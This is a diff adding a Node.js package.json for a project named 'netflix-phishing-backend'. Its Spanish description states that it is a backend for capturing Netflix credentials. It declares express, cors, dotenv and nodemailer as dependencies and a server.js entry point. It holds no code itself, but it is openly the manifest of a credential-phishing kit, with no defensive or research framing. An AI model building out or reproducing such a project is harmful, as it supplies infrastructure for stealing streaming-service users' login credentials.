@@ -1,0 +1,19 @@
+{
+  "name": "netflix-phishing-backend",
+  "version": "1.0.0",
+  "description": "Backend para capturar credenciales Netflix",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js",
+    "dev": "nodemon server.js"
+  },
+  "dependencies": {
+    "cors": "^2.8.5",
+    "dotenv": "^17.2.3",
+    "express": "^4.21.2",
+    "nodemailer": "^6.10.1"
+  },
+  "engines": {
+    "node": ">=14.0.0"
+  }
+}
